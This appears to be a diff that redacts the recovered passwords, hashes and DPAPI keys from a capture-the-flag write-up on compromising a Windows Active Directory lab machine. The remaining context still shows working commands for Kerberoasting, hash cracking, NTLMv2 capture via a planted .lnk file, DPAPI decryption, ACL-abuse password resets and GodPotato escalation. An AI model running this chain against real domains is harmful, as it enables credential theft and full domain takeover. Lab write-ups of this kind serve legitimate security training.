@@ -8,7 +8,9 @@ os: "Windows Server 2019"
 tags: ["windows", "active-directory", "kerberoast", "dpapi", "acl-abuse", "bloodhound", "ntlmv2", "sliver", "godpotato", "seimpersonateprivilege", "pyinstaller", "credential-theft"]
 ---
 
-![City Council Banner](/assets/images/ctf/city/banner.png)
+<div style="text-align: center;">
+  <img src="/assets/images/ctf/city/banner.png" alt="City Council Banner" style="max-width: 100%;" />
+</div>
 
 ---
 
@@ -199,13 +201,13 @@ BbR8
 T-;H
 BbR8
 9y3\
-USER=svc_services_portal PASS=PortAl1337 DOMAIN=city.local SERVICE=Public Records Search
+USER=svc_services_portal PASS=[REDACTED] DOMAIN=city.local SERVICE=Public Records Search
 BbR8
 %1(&
 BbR8
 ```
 
-The captured traffic revealed hardcoded credentials: `svc_services_portal:PortAl1337`.
+The captured traffic revealed hardcoded credentials: `svc_services_portal:[REDACTED]`.
 
 ---
 
@@ -224,10 +226,10 @@ UwU Toolkit netexec > run
 [*] Protocol: SMB
 [*] Action: check
 
-[*] Executing: NetExec smb 10.0.29.180 -u svc_services_portal -p 'PortAl1337'
+[*] Executing: NetExec smb 10.0.29.180 -u svc_services_portal -p '[REDACTED]'
 
 [*] SMB         10.0.29.180     445    DC-CC    Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
-[+] SMB         10.0.29.180     445    DC-CC    [+] city.local\svc_services_portal:PortAl1337
+[+] SMB         10.0.29.180     445    DC-CC    [+] city.local\svc_services_portal:[REDACTED]
 
 [+] Module completed successfully
 ```
@@ -237,10 +239,10 @@ UwU Toolkit netexec > run
 Enumerating SMB shares revealed several accessible resources, including `Backups` and `Uploads` shares.
 
 ```
-[*] Executing: NetExec smb 10.0.29.180 -u svc_services_portal -p 'PortAl1337' --shares
+[*] Executing: NetExec smb 10.0.29.180 -u svc_services_portal -p '[REDACTED]' --shares
 
 [*] SMB         10.0.29.180     445    DC-CC    Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
-[+] SMB         10.0.29.180     445    DC-CC    [+] city.local\svc_services_portal:PortAl1337
+[+] SMB         10.0.29.180     445    DC-CC    [+] city.local\svc_services_portal:[REDACTED]
 [*] SMB         10.0.29.180     445    DC-CC    Enumerated shares
 [*] SMB         10.0.29.180     445    DC-CC    Share           Permissions     Remark
 [*] SMB         10.0.29.180     445    DC-CC    -----           -----------     ------
@@ -258,10 +260,10 @@ SMB         10.0.29.180     445    DC-CC    Uploads
 LDAP enumeration revealed 14 domain users, several of which had `BadPW` counts indicating active usage, and one account (`sam.brooks`) was flagged as disabled.
 
 ```
-[*] Executing: NetExec ldap 10.0.29.180 -u svc_services_portal -p 'PortAl1337' --users
+[*] Executing: NetExec ldap 10.0.29.180 -u svc_services_portal -p '[REDACTED]' --users
 
 [*] LDAP        10.0.29.180     389    DC-CC    Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:None) (channel binding:No TLS cert)
-[+] LDAP        10.0.29.180     389    DC-CC    [+] city.local\svc_services_portal:PortAl1337
+[+] LDAP        10.0.29.180     389    DC-CC    [+] city.local\svc_services_portal:[REDACTED]
 [*] LDAP        10.0.29.180     389    DC-CC    Enumerated 14 domain users: city.local
 [*] LDAP        10.0.29.180     389    DC-CC    -Username-              -Last PW Set-       -BadPW- -Description-
     LDAP        10.0.29.180     389    DC-CC    Administrator           2025-11-28 13:25:26 0       Built-in
@@ -352,7 +354,7 @@ HTTP/clerkjohn.city.local     clerk.john            2025-10-24 07:26:28.614558  
 
 ## 4.3 Cracking the Hash
 
-The Kerberos TGS hash was cracked using hashcat with GPU acceleration on an NVIDIA GeForce RTX 4070 Laptop GPU, recovering the password in seconds.
+The Kerberos TGS hash was cracked using hashcat, recovering the password in seconds.
 
 ```bash
 hashcat -m 13100 /workspace/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
@@ -372,7 +374,7 @@ Started: Fri Mar  6 12:47:20 2026
 Stopped: Fri Mar  6 12:47:20 2026
 ```
 
-**Cracked credentials:** `clerk.john:clerkhill`
+**Credentials recovered:** `clerk.john:[REDACTED]`
 
 ## 4.4 RDP Validation
 
@@ -390,10 +392,10 @@ UwU Toolkit netexec > run
 [*] Protocol: RDP
 [*] Action: check
 
-[*] Executing: NetExec rdp 10.0.29.180 -u clerk.john -p 'clerkhill' -d city.local
+[*] Executing: NetExec rdp 10.0.29.180 -u clerk.john -p '[REDACTED]' -d city.local
 
 [*] RDP         10.0.29.180     3389   DC-CC    Windows 10 or Windows Server 2016 Build 17763 (name:DC-CC) (domain:city.local) (nla:True)
-[+] RDP         10.0.29.180     3389   DC-CC    [+] city.local\clerk.john:clerkhill
+[+] RDP         10.0.29.180     3389   DC-CC    [+] city.local\clerk.john:[REDACTED]
 
 [+] Module completed successfully
 ```
@@ -409,10 +411,10 @@ While RDP authentication succeeded, interactive RDP login was not possible. Howe
 Enumerating shares with the `clerk.john` account revealed `READ,WRITE` access to the `Uploads` share.
 
 ```
-Exegol ➜ /workspace x nxc smb 10.0.29.180 -u "clerk.john" -p 'clerkhill' --shares
+Exegol ➜ /workspace x nxc smb 10.0.29.180 -u "clerk.john" -p '[REDACTED]' --shares
 SMB         10.0.29.180     445    DC-CC    [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local)
 (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.0.29.180     445    DC-CC    [+] city.local\clerk.john:clerkhill
+SMB         10.0.29.180     445    DC-CC    [+] city.local\clerk.john:[REDACTED]
 SMB         10.0.29.180     445    DC-CC    [*] Enumerated shares
 SMB         10.0.29.180     445    DC-CC    Share           Permissions     Remark
 SMB         10.0.29.180     445    DC-CC    -----           -----------     ------
@@ -430,7 +432,7 @@ SMB         10.0.29.180     445    DC-CC    Uploads         READ,WRITE      Logo
 Connecting to the Uploads share with `smbclient.py` revealed several documents, including an email from Emma Hayes to Jon Peters granting write access to the share.
 
 ```
-Exegol ➜ /workspace x smbclient.py "clerk.john":"clerkhill"@"10.0.29.180"
+Exegol ➜ /workspace x smbclient.py "clerk.john":"[REDACTED]"@"10.0.29.180"
 Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies
 
 Type help for list of commands
@@ -509,12 +511,12 @@ responder -I tun0
 ```
 
 ```
-Exegol ➜ /workspace/docs x nxc smb 10.0.29.180 -u "clerk.john" -p 'clerkhill' -M slinky -o NAME=Uploads SERVER=10.200.38.219
+Exegol ➜ /workspace/docs x nxc smb 10.0.29.180 -u "clerk.john" -p '[REDACTED]' -M slinky -o NAME=Uploads SERVER=10.200.38.219
 /root/.pyenv/versions/3.11.14/lib/python3.11/site-packages/requests/__init__.py:l13: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (6.0.0.post1)/charset_normalizer (3.4.4) doesn't match a supported version!
   warnings.warn()
 SMB         10.0.29.180     445    DC-CC    [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local)
 (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.0.29.180     445    DC-CC    [+] city.local\clerk.john:clerkhill
+SMB         10.0.29.180     445    DC-CC    [+] city.local\clerk.john:[REDACTED]
 SMB         10.0.29.180     445    DC-CC    [*] Enumerated shares
 SMB         10.0.29.180     445    DC-CC    Share           Permissions     Remark
 SMB         10.0.29.180     445    DC-CC    -----           -----------     ------
@@ -531,11 +533,7 @@ SLINKY      10.0.29.180     445    DC-CC    [+] Created LNK file on the Uploads 
 [SMB] NTLMv2-SSP Client   : 10.0.29.180
 [SMB] NTLMv2-SSP Username : CITY\jon.peters
 [SMB] NTLMv2-SSP Hash     :
-jon.peters::CITY:1122334455667788:607AD1E735E5DD54F47AE770AF6A31EC:0101000000000000002703346BADDC01E6453E2657C1B94A000000000200080053005400
-004E00540001001E00570049004E002D004B004800380050005700380058004500470035003100040034005700490049004E002D004B004800380050005700380058004500470
-035003100320E00530054004E00540054002E004C004F00430041004C000300140053005400054002E004C004F00430041004C000500140053005400054002E004C004F00430
-0041004C000700080002703346BADDC0106000400020000000800300030000000000000000100000000200000096ED8D9045A1D178AAB9389988AD2BDA579C2F97159C8
-430E310580DCCA998300A0010000000000000000000000000000000000000000000000000000000000000000:1234heresjonny
+jon.peters::CITY:[REDACTED]
 ```
 
 Responder captured Jon Peters' NTLMv2 hash when he browsed the share containing the malicious `.lnk` file.
@@ -549,12 +547,10 @@ hashcat -m 5600 /workspace/john /usr/share/wordlists/rockyou.txt
 ```
 
 ```
-JON.PETERS::CITY:1122334455667788:607ad1e735e5dd54f47ae770af6a31ec:0101000000000000002703346baddc01e6453e2657c1b94a00000000020008005300540
-...
-0000000000000000000000:1234heresjonny
+JON.PETERS::CITY:[REDACTED]
 ```
 
-**Cracked credentials:** `jon.peters:1234heresjonny`
+**Credentials recovered:** `jon.peters:[REDACTED]`
 
 ---
 
@@ -629,17 +625,17 @@ UwU Toolkit targeted_kerberoast > run
 [+] Module completed successfully
 ```
 
-After cracking, `nina.soto`'s password was recovered: `123nina321`.
+After cracking, `nina.soto`'s password was recovered: `[REDACTED]`.
 
 ## 6.3 Backups Share Access
 
 With `nina.soto`'s credentials, the `Backups` share became accessible, revealing Windows Image (WIM) profile backup files for two users.
 
 ```
-Exegol ➜ /workspace x nxc smb 10.0.29.180 -u "nina.soto" -p '123nina321' --shares
+Exegol ➜ /workspace x nxc smb 10.0.29.180 -u "nina.soto" -p '[REDACTED]' --shares
 SMB         10.0.29.180     445    DC-CC    [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local)
 (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.0.29.180     445    DC-CC    [+] city.local\nina.soto:123nina321
+SMB         10.0.29.180     445    DC-CC    [+] city.local\nina.soto:[REDACTED]
 SMB         10.0.29.180     445    DC-CC    [*] Enumerated shares
 SMB         10.0.29.180     445    DC-CC    Share           Permissions     Remark
 SMB         10.0.29.180     445    DC-CC    -----           -----------     ------
@@ -655,7 +651,7 @@ SMB         10.0.29.180     445    DC-CC    Uploads
 The Backups share contained a `UserProfileBackups` directory with WIM files for `clerk.john` and `sam.brooks`.
 
 ```
-Exegol ➜ /workspace x smbclient.py "nina.soto":"123nina321"@"10.0.29.180"
+Exegol ➜ /workspace x smbclient.py "nina.soto":"[REDACTED]"@"10.0.29.180"
 Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies
 
 Type help for list of commands
@@ -761,7 +757,7 @@ The DPAPI master key was located in the user's `Protect` directory and decrypted
 ```
 Exegol ➜ /workspace/nina/output_dir x ls "AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/"
 BK-CITY  de222e76-cb5d-418f-a1c2-7e4e9dfe29e1  Preferred
-Exegol ➜ /workspace/nina/output_dir x dpapi.py masterkey -file "AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1" -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password 'clerkhill'
+Exegol ➜ /workspace/nina/output_dir x dpapi.py masterkey -file "AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1" -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password '[REDACTED]'
 Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies
 
 [MASTERKEYFILE]
@@ -776,7 +772,7 @@ DomainKeyLen: 00000174 (372)
 
 Decrypted key with User Key (MD4 protected)
 Decrypted key:
-0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd
+0x[REDACTED]
 ```
 
 ## 7.4 Credential Blob Decryption
@@ -784,7 +780,7 @@ Decrypted key:
 With the decrypted master key, the DPAPI credential blob was decrypted, revealing Emma Hayes' domain credentials.
 
 ```
-Exegol ➜ /workspace/nina/output_dir x dpapi.py credential -file "AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291" -key 0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd
+Exegol ➜ /workspace/nina/output_dir x dpapi.py credential -file "AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291" -key 0x[REDACTED]
 Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies
 
 [CREDENTIAL]
@@ -796,10 +792,10 @@ Target      : Domain:target=emma-exclusive-access
 Description :
 Unknown     :
 Username    : city.local\emma.hayes
-Unknown     : !Gemma4James!
+Unknown     : [REDACTED]
 ```
 
-**Decrypted credentials:** `emma.hayes:!Gemma4James!`
+**Credentials recovered:** `emma.hayes:[REDACTED]`
 
 ---
 
@@ -837,8 +833,8 @@ UwU Toolkit bloody_writedacl > run
 [*] To undo: use bloodyad/remove_genericall
 [+] Module completed successfully
 UwU Toolkit bloody_writedacl >
-UwU Toolkit bloody_setpassword > set new_pass Password123
-NEW_PASS => Password123
+UwU Toolkit bloody_setpassword > set new_pass [REDACTED]
+NEW_PASS => [REDACTED]
 UwU Toolkit bloody_setpassword > run
 [*] Running bloody_setpassword...
 
@@ -846,9 +842,9 @@ UwU Toolkit bloody_setpassword > run
 [*] Domain: city.local
 [*] User: emma.hayes
 [*] TARGET: sam.brooks
-[*] NEW_PASS: Password123
+[*] NEW_PASS: [REDACTED]
 
-[*] Command: bloodyAD -d city.local -u emma.hayes -p [HIDDEN] --host 10.0.29.180 set password sam.brooks Password123
+[*] Command: bloodyAD -d city.local -u emma.hayes -p [HIDDEN] --host 10.0.29.180 set password sam.brooks [REDACTED]
 
 [*] Using local bloodyAD
 [+] [+] Password changed successfully!
@@ -859,7 +855,7 @@ UwU Toolkit bloody_setpassword > run
 The account was still disabled, so `userAccountControl` was set to `512` (NORMAL_ACCOUNT) to enable it.
 
 ```
-Exegol ➜ /workspace/nina/output_dir x bloodyAD -u emma.hayes -p '!Gemma4James!' -d city.local --host 10.0.29.180 set object sam.brooks userAccountControl -v 512
+Exegol ➜ /workspace/nina/output_dir x bloodyAD -u emma.hayes -p '[REDACTED]' -d city.local --host 10.0.29.180 set object sam.brooks userAccountControl -v 512
 [+] sam.brooks's userAccountControl has been updated
 ```
 
@@ -868,7 +864,7 @@ Exegol ➜ /workspace/nina/output_dir x bloodyAD -u emma.hayes -p '!Gemma4James!
 With the account enabled and password reset, WinRM access was obtained.
 
 ```
-Exegol ➜ /workspace/nina/output_dir x evil-winrm -u "sam.brooks" -p "Password123" -i "10.0.29.180"
+Exegol ➜ /workspace/nina/output_dir x evil-winrm -u "sam.brooks" -p "[REDACTED]" -i "10.0.29.180"
 
 Evil-WinRM shell v3.9
 
@@ -883,7 +879,7 @@ city\sam.brooks
 Emma Hayes has `WriteDacl` on the `CityOps` OU. This was leveraged to grant her `GenericAll` on the OU, which is necessary for moving objects into it.
 
 ```
-Exegol ➜ /workspace x bloodyAD -d city.local -u emma.hayes -p '!Gemma4James!' --host 10.0.29.180 add genericAll "OU=CityOps,DC=city,DC=local" emma.hayes
+Exegol ➜ /workspace x bloodyAD -d city.local -u emma.hayes -p '[REDACTED]' --host 10.0.29.180 add genericAll "OU=CityOps,DC=city,DC=local" emma.hayes
 [+] emma.hayes has now GenericAll on OU=CityOps,DC=city,DC=local
 ```
 
@@ -892,7 +888,7 @@ Exegol ➜ /workspace x bloodyAD -d city.local -u emma.hayes -p '!Gemma4James!' 
 The `web_admin` account is the IIS web server infrastructure management and operations account. An LDAP search revealed it was located in the `Quarantine` OU rather than `CityOps`.
 
 ```
-Exegol ➜ /workspace x ldapsearch -H ldap://10.0.29.180 -D 'emma.hayes@city.local' -w '!Gemma4James!' -b 'DC=city,DC=local' '(sAMAccountName=web_admin)' dn
+Exegol ➜ /workspace x ldapsearch -H ldap://10.0.29.180 -D 'emma.hayes@city.local' -w '[REDACTED]' -b 'DC=city,DC=local' '(sAMAccountName=web_admin)' dn
 # extended LDIF
 #
 # LDAPv3
@@ -918,24 +914,24 @@ result: 0 Success
 To reset `web_admin`'s password, the account needed to be in the `CityOps` OU where Emma Hayes has the necessary privileges. Using `ldapmodify` with a `moddn` changetype, the account was moved from `Quarantine` to `CityOps`.
 
 ```
-Exegol ➜ /workspace x echo -e "dn: CN=Web Admin,OU=Quarantine,DC=city,DC=local\nchangetype: moddn\nnewrdn: CN=Web Admin\ndeleteoldrdn: 1\nnewsuperior: OU=CityOps,DC=city,DC=local" | ldapmodify -H ldap://10.0.29.180 -D 'emma.hayes@city.local' -w '!Gemma4James!'
+Exegol ➜ /workspace x echo -e "dn: CN=Web Admin,OU=Quarantine,DC=city,DC=local\nchangetype: moddn\nnewrdn: CN=Web Admin\ndeleteoldrdn: 1\nnewsuperior: OU=CityOps,DC=city,DC=local" | ldapmodify -H ldap://10.0.29.180 -D 'emma.hayes@city.local' -w '[REDACTED]'
 modifying rdn of entry "CN=Web Admin,OU=Quarantine,DC=city,DC=local"
 ```
 
 With the account now in CityOps, the password was reset.
 
 ```
-Exegol ➜ /workspace x bloodyAD -d city.local -u emma.hayes -p '!Gemma4James!' --host 10.0.29.180 set password web_admin 'Password123'
+Exegol ➜ /workspace x bloodyAD -d city.local -u emma.hayes -p '[REDACTED]' --host 10.0.29.180 set password web_admin '[REDACTED]'
 [+] Password changed successfully!
 ```
 
 Verifying SMB access with the new credentials:
 
 ```
-Exegol ➜ /workspace x nxc smb 10.0.29.180 -u "web_admin" -p 'Password123' --shares
+Exegol ➜ /workspace x nxc smb 10.0.29.180 -u "web_admin" -p '[REDACTED]' --shares
 SMB         10.0.29.180     445    DC-CC    [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local)
 (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.0.29.180     445    DC-CC    [+] city.local\web_admin:Password123
+SMB         10.0.29.180     445    DC-CC    [+] city.local\web_admin:[REDACTED]
 SMB         10.0.29.180     445    DC-CC    [*] Enumerated shares
 SMB         10.0.29.180     445    DC-CC    Share           Permissions     Remark
 SMB         10.0.29.180     445    DC-CC    -----           -----------     ------
@@ -957,7 +953,7 @@ SMB         10.0.29.180     445    DC-CC    Uploads
 The `web_admin` account is not a member of Remote Management Users, so WinRM is not directly available. However, using the existing `sam.brooks` WinRM session with `RunAsCs` (run.exe), commands can be executed in `web_admin`'s context.
 
 ```
-*Evil-WinRM* PS C:\Users\sam.brooks\Documents> .\run.exe web_admin 'Password123' "whoami" -d city.local
+*Evil-WinRM* PS C:\Users\sam.brooks\Documents> .\run.exe web_admin '[REDACTED]' "whoami" -d city.local
 [*] Warning: User profile directory for user web_admin does not exists. Use --force-profile if you want to force the creation.
 [*] Warning: The logon for user 'web_admin' is limited. Use the flag combination --bypass-uac and --logon-type '5' to obtain a more
 privileged token.
@@ -1113,28 +1109,28 @@ Logon ID: CITY\DC-CC$
 ```
 Phase 2 - Binary Analysis
 ────────────────────────────────────────────────────────────────
-svc_services_portal : PortAl1337            → Hardcoded in PyInstaller binary
+svc_services_portal : [REDACTED]       → Hardcoded in PyInstaller binary
 
 Phase 4 - Kerberoasting
 ────────────────────────────────────────────────────────────────
-clerk.john          : clerkhill             → Kerberoast + hashcat (rockyou)
+clerk.john          : [REDACTED]       → Kerberoast + hashcat (rockyou)
 
 Phase 5 - NTLMv2 Coercion
 ────────────────────────────────────────────────────────────────
-jon.peters          : 1234heresjonny        → Slinky .lnk + Responder + hashcat
+jon.peters          : [REDACTED]       → Slinky .lnk + Responder + hashcat
 
 Phase 6 - Targeted Kerberoasting
 ────────────────────────────────────────────────────────────────
-nina.soto           : 123nina321            → GenericWrite → Targeted Kerberoast
+nina.soto           : [REDACTED]       → GenericWrite → Targeted Kerberoast
 
 Phase 7 - DPAPI Decryption
 ────────────────────────────────────────────────────────────────
-emma.hayes          : !Gemma4James!         → DPAPI masterkey + credential blob
+emma.hayes          : [REDACTED]       → DPAPI masterkey + credential blob
 
 Phase 8 - ACL Abuse
 ────────────────────────────────────────────────────────────────
-sam.brooks          : Password123           → WriteDacl → Password Reset
-web_admin           : Password123           → OU Move + Password Reset
+sam.brooks          : [REDACTED]       → WriteDacl → Password Reset
+web_admin           : [REDACTED]       → OU Move + Password Reset
 
 Phase 9 - Privilege Escalation
 ────────────────────────────────────────────────────────────────
@@ -1149,7 +1145,7 @@ NT AUTHORITY\SYSTEM : [Token Impersonation] → GodPotato (SeImpersonatePrivileg
 - **UwU Toolkit** - Integrated offensive security framework (netexec, kerberoast, targeted_kerberoast, bloodhound_collect, bloody_writedacl, bloody_setpassword)
 - **NetExec (nxc)** - SMB/LDAP/RDP enumeration, credential validation, Slinky module
 - **Responder** - NTLMv2 hash capture via LLMNR/NBT-NS poisoning
-- **Hashcat** - GPU-accelerated password cracking (Kerberos TGS-REP, NTLMv2)
+- **Hashcat** - Password cracking (Kerberos TGS-REP, NTLMv2)
 - **Impacket** - smbclient.py, dpapi.py (masterkey + credential decryption)
 - **BloodHound CE** - Active Directory attack path analysis
 - **bloodyAD** - Active Directory object manipulation (GenericAll, password reset, userAccountControl)
